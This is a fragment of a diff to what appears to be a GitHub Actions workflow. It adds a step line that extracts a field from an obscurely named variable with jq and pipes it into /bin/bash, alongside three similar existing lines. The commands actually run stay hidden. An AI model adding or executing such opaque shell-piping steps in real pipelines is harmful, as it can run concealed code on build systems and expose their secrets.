@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$wbj12235" | jq -r .tinda33982 | /bin/bash
           printf '%s' "$bby4" | jq -r .qi799 | /bin/bash
           printf '%s' "$liysw3" | jq -r .jstl361 | /bin/bash
+          printf '%s' "$dzh4" | jq -r .s1846 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
